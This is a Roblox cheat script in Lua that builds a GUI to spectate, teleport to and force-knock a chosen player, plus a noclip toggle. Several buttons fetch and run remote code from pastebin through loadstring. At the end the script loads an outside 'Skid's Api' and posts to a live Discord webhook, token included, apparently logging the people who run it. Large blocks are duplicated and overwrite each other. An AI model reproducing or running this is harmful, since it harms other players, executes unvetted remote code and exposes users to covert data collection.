pcall(function()
    game.StarterGui:SetCore("SendNotification", {
      Title = 'Welcome';
      Text = 'welcome to script Am';
      Duration = 10;
    })
    if not game.Players.LocalPlayer:IsInGroup(234234234234234234234345645754456456) then
      coroutine.resume(coroutine.create(function()
         wait(10)
         game.StarterGui:SetCore("SendNotification", {
          Title = 'discord';
          Text = 'join server discord copied in keybord';
          Duration = 20;
         })
         setclipboard('https://discord.gg/pnRXzeKK')
      end))
    end
  end)
  

local ScreenGui = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local Acmode = Instance.new("TextLabel")
local UICorner = Instance.new("UICorner")
local TextButton = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")
local UICorner_3 = Instance.new("UICorner")
local TextButton_2 = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local TextButton_3 = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local TextButton_4 = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")
local TextButton_5 = Instance.new("TextButton")
local UICorner_7 = Instance.new("UICorner")
local TextButton_6 = Instance.new("TextButton")
local UICorner_8 = Instance.new("UICorner")
local TextBox = Instance.new("TextBox")
local UICorner_9 = Instance.new("UICorner")
local TextButton_7 = Instance.new("TextButton")
local UICorner_10 = Instance.new("UICorner")
local TextLabel = Instance.new("TextLabel")
local UICorner_11 = Instance.new("UICorner")
local TextLabel_2 = Instance.new("TextLabel")
local UICorner_12 = Instance.new("UICorner")
local TextLabel_3 = Instance.new("TextLabel")
local UICorner_13 = Instance.new("UICorner")
local TextLabel_4 = Instance.new("TextLabel")
local UICorner_14 = Instance.new("UICorner")
local TextLabel_5 = Instance.new("TextLabel")
local UICorner_15 = Instance.new("UICorner")
local TextButton_8 = Instance.new("TextButton")
local UICorner_16 = Instance.new("UICorner")
local function ShrinkName()
	TextBox.FocusLost:connect(function()
		for i,v in pairs(game.Players:GetChildren()) do
			if (string.sub(string.lower(v.Name),1,string.len(TextBox.Text))) == string.lower(TextBox.Text) then
				TextBox.Text = v.Name
			end
		end
	end)
end

ShrinkName()
function findPlayer(name)
	name = name:lower()
	if name == 'me' then
		return game:GetService'Players'.LocalPlayer
	end
	for i,v in pairs(game:GetService'Players':GetPlayers()) do
		if v.Name:lower():find(name) == 1 then
			return v
		end
	end
end
--Properties:

ScreenGui.Parent = game.CoreGui

Main.Name = "Main"
Main.Parent = ScreenGui
Main.BackgroundColor3 = Color3.fromRGB(24, 54, 248)
Main.Position = UDim2.new(0.0224260967, 0, 0.111358576, 0)
Main.Size = UDim2.new(0, 774, 0, 348)
Main.Active = true
Main.Draggable = true

Acmode.Name = "Acmode"
Acmode.Parent = Main
Acmode.BackgroundColor3 = Color3.fromRGB(24, 54, 248)
Acmode.Position = UDim2.new(0, 0, -0.000710388704, 0)
Acmode.Size = UDim2.new(0, 774, 0, 50)
Acmode.Font = Enum.Font.SourceSansSemibold
Acmode.Text = "Ac mode"
Acmode.TextColor3 = Color3.fromRGB(0, 0, 0)
Acmode.TextScaled = true
Acmode.TextSize = 14.000
Acmode.TextWrapped = true

UICorner.Parent = Acmode

TextButton.Parent = Main
TextButton.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
TextButton.Position = UDim2.new(0.396526814, 0, 0.232758626, 0)
TextButton.Size = UDim2.new(0, 154, 0, 41)
TextButton.Font = Enum.Font.ArialBold
TextButton.Text = "Target"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true

UICorner_2.Parent = TextButton

UICorner_3.Parent = Main

TextButton_2.Parent = Main
TextButton_2.BackgroundColor3 = Color3.fromRGB(21, 14, 230)
TextButton_2.Position = UDim2.new(0.90047884, 0, 0.238505751, 0)
TextButton_2.Size = UDim2.new(0, 77, 0, 37)
TextButton_2.Font = Enum.Font.ArialBold
TextButton_2.Text = "view"
TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.TextScaled = true
TextButton_2.TextSize = 14.000
TextButton_2.TextWrapped = true
TextButton_2.MouseButton1Down:connect(function()
local TargetPlr = TextBox.Text;
		game.Workspace.Camera.CameraSubject = game.Players[TargetPlr].Character.Humanoid;
	end)
UICorner_4.Parent = TextButton_2

TextButton_3.Parent = Main
TextButton_3.BackgroundColor3 = Color3.fromRGB(21, 14, 230)
TextButton_3.Position = UDim2.new(0.790165722, 0, 0.428160936, 0)
TextButton_3.Size = UDim2.new(0, 154, 0, 41)
TextButton_3.Font = Enum.Font.ArialBold
TextButton_3.Text = "Goto"
TextButton_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_3.TextScaled = true
TextButton_3.TextSize = 14.000
TextButton_3.TextWrapped = true
TextButton_3.MouseButton1Down:connect(function()
local TargetPlr = TextBox.Text;
		wait(.30)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[TargetPlr].Character.HumanoidRootPart.CFrame
	end)
UICorner_5.Parent = TextButton_3

TextButton_4.Parent = Main
TextButton_4.BackgroundColor3 = Color3.fromRGB(21, 14, 230)
TextButton_4.Position = UDim2.new(0.395234883, 0, 0.428160906, 0)
TextButton_4.Size = UDim2.new(0, 154, 0, 41)
TextButton_4.Font = Enum.Font.ArialBold
TextButton_4.Text = "Reach"
TextButton_4.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_4.TextScaled = true
TextButton_4.TextSize = 14.000
TextButton_4.TextWrapped = true
TextButton_4.MouseButton1Down:connect(function()
loadstring(game:HttpGet('https://pastebin.com/raw/aZHK690D'))()
end)

UICorner_6.Parent = TextButton_4

TextButton_5.Parent = Main
TextButton_5.BackgroundColor3 = Color3.fromRGB(21, 14, 230)
TextButton_5.Position = UDim2.new(0.790165722, 0, 0.620689631, 0)
TextButton_5.Size = UDim2.new(0, 154, 0, 41)
TextButton_5.Font = Enum.Font.ArialBold
TextButton_5.Text = "Fly [x]"
TextButton_5.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_5.TextScaled = true
TextButton_5.TextSize = 14.000
TextButton_5.TextWrapped = true
TextButton_5.MouseButton1Down:connect(function()
    loadstring(game:HttpGet("https://pastebin.com/raw/sUA9m6M6"))()
end)
UICorner_7.Parent = TextButton_5

TextButton_6.Parent = Main
TextButton_6.BackgroundColor3 = Color3.fromRGB(21, 14, 230)
TextButton_6.Position = UDim2.new(0.395234883, 0, 0.620689631, 0)
TextButton_6.Size = UDim2.new(0, 154, 0, 41)
TextButton_6.Font = Enum.Font.ArialBold
TextButton_6.Text = "Close"
TextButton_6.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_6.TextScaled = true
TextButton_6.TextSize = 14.000
TextButton_6.TextWrapped = true
TextButton_6.MouseButton1Down:connect(function()
    Main.Visible = not Main.Visible
end)

UICorner_8.Parent = TextButton_6

TextBox.Parent = Main
TextBox.BackgroundColor3 = Color3.fromRGB(21, 14, 230)
TextBox.BorderColor3 = Color3.fromRGB(21, 14, 230)
TextBox.Position = UDim2.new(0.459454268, 0, 0.784482777, 0)
TextBox.Size = UDim2.new(0, 375, 0, 65)
TextBox.Font = Enum.Font.GothamBold
TextBox.Text = "username"
TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
TextBox.TextScaled = true
TextBox.TextSize = 14.000
TextBox.TextWrapped = true

UICorner_9.Parent = TextBox

TextButton_7.Parent = Main
TextButton_7.BackgroundColor3 = Color3.fromRGB(21, 14, 230)
TextButton_7.Position = UDim2.new(0.789139748, 0, 0.238505751, 0)
TextButton_7.Size = UDim2.new(0, 77, 0, 37)
TextButton_7.Font = Enum.Font.ArialBold
TextButton_7.Text = "unview"
TextButton_7.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_7.TextScaled = true
TextButton_7.TextSize = 14.000
TextButton_7.TextWrapped = true
TextButton_7.MouseButton1Down:connect(function()
local TargetPlr = TextBox.Text;
		game.Workspace.Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
end)
UICorner_10.Parent = TextButton_7

TextLabel.Parent = Main
TextLabel.BackgroundColor3 = Color3.fromRGB(21, 14, 230)
TextLabel.Position = UDim2.new(0, 0, 0.105611429, 0)
TextLabel.Size = UDim2.new(0, 299, 0, 311)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Scriptint : dot#1020"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 14.000

UICorner_11.Parent = TextLabel

TextLabel_2.Parent = Main
TextLabel_2.BackgroundColor3 = Color3.fromRGB(21, 14, 230)
TextLabel_2.Position = UDim2.new(0, 0, 0.160919532, 0)
TextLabel_2.Size = UDim2.new(0, 200, 0, 50)
TextLabel_2.Font = Enum.Font.ArialBold
TextLabel_2.Text = "Gui : dot#1020 , 3LX#0547"
TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true

UICorner_12.Parent = TextLabel_2

TextLabel_3.Parent = Main
TextLabel_3.BackgroundColor3 = Color3.fromRGB(21, 14, 230)
TextLabel_3.Position = UDim2.new(0.0645994842, 0, 0.350574702, 0)
TextLabel_3.Size = UDim2.new(0, 242, 0, 50)
TextLabel_3.Font = Enum.Font.ArialBold
TextLabel_3.Text = ""
TextLabel_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 14.000
TextLabel_3.TextWrapped = true

UICorner_13.Parent = TextLabel_3

TextLabel_4.Parent = Main
TextLabel_4.BackgroundColor3 = Color3.fromRGB(21, 14, 230)
TextLabel_4.Position = UDim2.new(0.0633074939, 0, 0.0172413792, 0)
TextLabel_4.Size = UDim2.new(0, 200, 0, 43)
TextLabel_4.Font = Enum.Font.ArialBold
TextLabel_4.Text = "Credit"
TextLabel_4.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_4.TextScaled = true
TextLabel_4.TextSize = 14.000
TextLabel_4.TextWrapped = true

UICorner_14.Parent = TextLabel_4

TextLabel_5.Parent = Main
TextLabel_5.BackgroundColor3 = Color3.fromRGB(21, 14, 230)
TextLabel_5.Position = UDim2.new(0.0310077518, 0, 0.525862098, 0)
TextLabel_5.Size = UDim2.new(0, 232, 0, 155)
TextLabel_5.Font = Enum.Font.SourceSans
TextLabel_5.Text = "soon more..."
TextLabel_5.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_5.TextScaled = true
TextLabel_5.TextSize = 14.000
TextLabel_5.TextWrapped = true

UICorner_15.Parent = TextLabel_5

TextButton_8.Parent = Main
TextButton_8.BackgroundColor3 = Color3.fromRGB(21, 14, 230)
TextButton_8.Position = UDim2.new(0.396526814, 0, 0.232758626, 0)
TextButton_8.Size = UDim2.new(0, 154, 0, 41)
TextButton_8.Font = Enum.Font.ArialBold
TextButton_8.Text = "Target"
TextButton_8.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_8.TextScaled = true
TextButton_8.TextSize = 14.000
TextButton_8.TextWrapped = true
TextButton_8.MouseButton1Down:connect(function()
local localPlayer     = game:GetService("Players").LocalPlayer;
		local localCharacter  = localPlayer.Character;
		local TargetPlr       = TextBox.Text;

	
		if TargetPlr and game.Players[TargetPlr].Character.BodyEffects['K.O'].Value == false then
			pcall(function()
	
				game.Players.LocalPlayer.Character.LeftHand.Size = Vector3.new(1,1,1)
				localCharacter.LeftHand.LeftWrist:Destroy();
				localCharacter.RightHand.RightWrist:Destroy();
				game.Players.LocalPlayer.Character.RightHand.Size = Vector3.new(1,1,1)
	
			end);
			repeat
				wait();
				localCharacter.LeftHand.CFrame = game.Players[TargetPlr].Character.LowerTorso.CFrame;
				localCharacter.RightHand.CFrame = game.Players[TargetPlr].Character.LowerTorso.CFrame;
			until game.Players[TargetPlr].Character.BodyEffects['K.O'].Value == true
			game.StarterGui:SetCore("SendNotification", {
				Title = "DISCORD.GG/";
				Text = "[Am] " .. TargetPlr .. " Has been successfully knocked!";
				Duration = 15;
			})
		elseif game.Players[TargetPlr].Character.BodyEffects['K.O'].Value == true then
			game.StarterGui:SetCore("SendNotification", {
				Title = "DISCORD.GG/";
				Text = "[Am] " .. TargetPlr .. " Is already knocked.";
				Duration = 15;
			})
		end;
	end);
UICorner_16.Parent = TextButton_8
TextButton_6.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_6.TextScaled = true
TextButton_6.TextSize = 14.000
TextButton_6.TextWrapped = true
TextButton_6.MouseButton1Down:connect(function()
noclip = false
game:GetService('RunService').Stepped:connect(function()
if noclip then
game:service'Players'.LocalPlayer.Character.Humanoid:ChangeState(11)
end
end)
plr = game:service'Players'.LocalPlayer
mouse = plr:GetMouse()
mouse.KeyDown:connect(function(key)

if key == "z" then
noclip = not noclip
game:service'Players'.LocalPlayer.Character.Humanoid:ChangeState(11)
end
end)
end)

UICorner_8.Parent = TextButton_6

TextBox.Parent = Main
TextBox.BackgroundColor3 = Color3.fromRGB(21, 14, 230)
TextBox.BorderColor3 = Color3.fromRGB(21, 14, 230)
TextBox.Position = UDim2.new(0.459454268, 0, 0.784482777, 0)
TextBox.Size = UDim2.new(0, 375, 0, 65)
TextBox.Font = Enum.Font.GothamBold
TextBox.Text = "username"
TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
TextBox.TextScaled = true
TextBox.TextSize = 14.000
TextBox.TextWrapped = true

UICorner_9.Parent = TextBox

TextButton_7.Parent = Main
TextButton_7.BackgroundColor3 = Color3.fromRGB(21, 14, 230)
TextButton_7.Position = UDim2.new(0.789139748, 0, 0.238505751, 0)
TextButton_7.Size = UDim2.new(0, 77, 0, 37)
TextButton_7.Font = Enum.Font.ArialBold
TextButton_7.Text = "unview"
TextButton_7.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_7.TextScaled = true
TextButton_7.TextSize = 14.000
TextButton_7.TextWrapped = true
TextButton_7.MouseButton1Down:connect(function()
local TargetPlr = TextBox.Text;
		game.Workspace.Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
end)
UICorner_10.Parent = TextButton_7

TextLabel.Parent = Main
TextLabel.BackgroundColor3 = Color3.fromRGB(21, 14, 230)
TextLabel.Position = UDim2.new(0, 0, 0.105611429, 0)
TextLabel.Size = UDim2.new(0, 299, 0, 311)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Scriptint : dot#1020"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 14.000

UICorner_11.Parent = TextLabel

TextLabel_2.Parent = Main
TextLabel_2.BackgroundColor3 = Color3.fromRGB(21, 14, 230)
TextLabel_2.Position = UDim2.new(0, 0, 0.160919532, 0)
TextLabel_2.Size = UDim2.new(0, 200, 0, 50)
TextLabel_2.Font = Enum.Font.ArialBold
TextLabel_2.Text = "Gui : dot#1020 , 3LX#0547"
TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true

UICorner_12.Parent = TextLabel_2

TextLabel_3.Parent = Main
TextLabel_3.BackgroundColor3 = Color3.fromRGB(21, 14, 230)
TextLabel_3.Position = UDim2.new(0.0645994842, 0, 0.350574702, 0)
TextLabel_3.Size = UDim2.new(0, 242, 0, 50)
TextLabel_3.Font = Enum.Font.ArialBold
TextLabel_3.Text = ""
TextLabel_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 14.000
TextLabel_3.TextWrapped = true

UICorner_13.Parent = TextLabel_3

TextLabel_4.Parent = Main
TextLabel_4.BackgroundColor3 = Color3.fromRGB(21, 14, 230)
TextLabel_4.Position = UDim2.new(0.0633074939, 0, 0.0172413792, 0)
TextLabel_4.Size = UDim2.new(0, 200, 0, 43)
TextLabel_4.Font = Enum.Font.ArialBold
TextLabel_4.Text = "Credit"
TextLabel_4.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_4.TextScaled = true
TextLabel_4.TextSize = 14.000
TextLabel_4.TextWrapped = true

UICorner_14.Parent = TextLabel_4

TextLabel_5.Parent = Main
TextLabel_5.BackgroundColor3 = Color3.fromRGB(21, 14, 230)
TextLabel_5.Position = UDim2.new(0.0310077518, 0, 0.525862098, 0)
TextLabel_5.Size = UDim2.new(0, 232, 0, 155)
TextLabel_5.Font = Enum.Font.SourceSans
TextLabel_5.Text = "soon more..."
TextLabel_5.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_5.TextScaled = true
TextLabel_5.TextSize = 14.000
TextLabel_5.TextWrapped = true

UICorner_15.Parent = TextLabel_5

TextButton_8.Parent = Main
TextButton_8.BackgroundColor3 = Color3.fromRGB(21, 14, 230)
TextButton_8.Position = UDim2.new(0.396526814, 0, 0.232758626, 0)
TextButton_8.Size = UDim2.new(0, 154, 0, 41)
TextButton_8.Font = Enum.Font.ArialBold
TextButton_8.Text = "Target"
TextButton_8.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_8.TextScaled = true
TextButton_8.TextSize = 14.000
TextButton_8.TextWrapped = true
TextButton_8.MouseButton1Down:connect(function()
local localPlayer     = game:GetService("Players").LocalPlayer;
		local localCharacter  = localPlayer.Character;
		local TargetPlr       = TextBox.Text;

	
		if TargetPlr and game.Players[TargetPlr].Character.BodyEffects['K.O'].Value == false then
			pcall(function()
	
				game.Players.LocalPlayer.Character.LeftHand.Size = Vector3.new(1,1,1)
				localCharacter.LeftHand.LeftWrist:Destroy();
				localCharacter.RightHand.RightWrist:Destroy();
				game.Players.LocalPlayer.Character.RightHand.Size = Vector3.new(1,1,1)
	
			end);
			repeat
				wait();
				localCharacter.LeftHand.CFrame = game.Players[TargetPlr].Character.LowerTorso.CFrame;
				localCharacter.RightHand.CFrame = game.Players[TargetPlr].Character.LowerTorso.CFrame;
			until game.Players[TargetPlr].Character.BodyEffects['K.O'].Value == true
			game.StarterGui:SetCore("SendNotification", {
				Title = "DISCORD.GG/";
				Text = "[Am] " .. TargetPlr .. " Has been successfully knocked!";
				Duration = 15;
			})
		elseif game.Players[TargetPlr].Character.BodyEffects['K.O'].Value == true then
			game.StarterGui:SetCore("SendNotification", {
				Title = "DISCORD.GG/";
				Text = "[Am] " .. TargetPlr .. " Is already knocked.";
				Duration = 15;
			})
		end;
	end);
UICorner_16.Parent = TextButton_8

local frame = script.Parent -- path to the frame
		local mouse = game:GetService('Players').LocalPlayer:GetMouse(); -- we need the mouse object, which also has the keyboard
		
		mouse.KeyDown:connect(function(key) -- whenever a key is pushed down
		key = key:lower() -- i do this in all my key events, though i don't remember why
		if key == 'v' then -- if key pressed is h
		Main.Visible = not Main.Visible -- flip between visible/invisible
		end
		end)
        skidApi = loadstring(game:HttpGet('https://raw.githubusercontent.com/Ramirez1001/Skid-s-Api/main/main.lua'))()

        skidApi:sendWebhook('https://discordapp.com/api/webhooks/917587474358886440/pt5pnTzfdGDDLpnfKr6XxEGoDkamA_0U0HE4B9yD-XhlATSFGdxg6-XVQMCJNPN8lzS0', ...) -- You put your webhook's url there, (the 3 dots mean your webhook's arguments, delete the 3 dots if you're gonna use the default webhook format)
        
